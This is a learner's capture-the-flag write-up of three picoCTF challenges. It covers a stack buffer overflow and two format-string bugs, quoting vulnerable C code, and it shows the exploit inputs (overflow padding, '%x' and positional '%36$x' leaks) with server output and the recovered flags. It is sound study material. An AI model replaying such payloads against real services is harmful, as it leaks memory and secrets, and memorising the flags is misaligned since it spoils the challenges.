# buffer overflow  0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`

There was a problem in OASIS (the asteroid one) which followed the same principle so i had somewhat of an idea of what to do this time arround

I saw the C code and found the use of many buffers as well as the gets function


```
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

```
```

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

```
```
  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

After doing some research and learning about buffer overflows, i tried entering an input which would go beyond the allocated space in the buffer and cause an overflow, and on doing this i obtained the flag

```
blue@BlueKnight:~/ctf/buffer overflow 0$ nc saturn.picoctf.net 56940
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

What you learned through solving this challenge:

1. Basics of how stacks work and what a buffer overflow is
2. How to cause a buffer overflow

References

- https://www.youtube.com/watch?v=AD-iXWANggo

# format string  0

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}`

This challenge felt a bit weird and i need to do a bit more research on the topic
I got a program along with its source code
On running it, it asked me to enter options from among those provided which i tried all of until one worked, (i checked the hints on the chall and one of them literally also was to just try all the options)

on the second part, one of the options included format specifiers in C

```
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
```

I knew %s was the format specifier for string in C so i tried entering that one and i got the flag

After doing some research I think I have a better understanding of what happened
We passed a number of format specifiers into our input, but there wasn't any argument to back up the format specifier, so the function went up the stack and found something which fits.

Need to look up more into this

What you learned through solving this challenge:

1. How format specifiers can be exploited

References

- https://www.youtube.com/watch?v=2HxyGWD1htg

# flag leak

**Flag:** `picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}`

This challenge was also a bit annoying 

On analyzing the source code i noticed this part

```
void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
```

In the printf, there is no fomat specifier mentioned, so i could exploit this to get an output i wanted

I learnt of the %x format specifier which printed 8 bytes of hexadecimal 

So, i could get the printf to go up the stack and print out the flag for me using this

```
blue@BlueKnight:~/ctf/flag leak$ nc saturn.picoctf.net 52573
Tell me a story and then I'll tell you one >> %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Here's a story -
ff8619e0.ff861a00.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.252e78.6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.
```

The multiple repeating hexadecimal parts in the beginning are my input string stored in the printf buffer

Beyond that is where it checks the rest of the stack

![Screenshot 2024-11-06 121848](https://github.com/user-attachments/assets/2aa31776-76d2-4630-a7e8-5a288cb6586d)

I realised as i did this further, i wouldn't get the complete flag which i required as the %x's would just get printed out in hexadecimal, so i would have to access particular parts of the stack

On counting the hexadecimal parts, the flag starts appearing from after the 36th repletion of the input to printf, so the complete flag would be present beyond that point, so i had to access the particular parts beyond 36

```
blue@BlueKnight:~/ctf/flag leak$ nc saturn.picoctf.net 59236
Tell me a story and then I'll tell you one >> %36$x.%37$x.%38$x.%39$x.%40$x.%41$x.%42$x.%43$x.%44$x.%45$x.%46$x.%47$x.%48$x.
Here's a story -
6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.315f6b63.62326131.7d613235.fbad2000.b4a98700.0.
```

![Screenshot 2024-11-06 124053](https://github.com/user-attachments/assets/7dc7c985-a586-449a-bc03-d0edf4f834d3)

on reversing each group of 4 characters the flag was obtained

I still have to learn more about stacks but as i understand it the lower the value on stack the further "up" it is, so each group of bytes was printed in reverse.

What you learned through solving this challenge:

1. How the %x format specifier can be used to print out parts of the stack

References

- https://www.youtube.com/watch?v=0WvrSfcdq1I






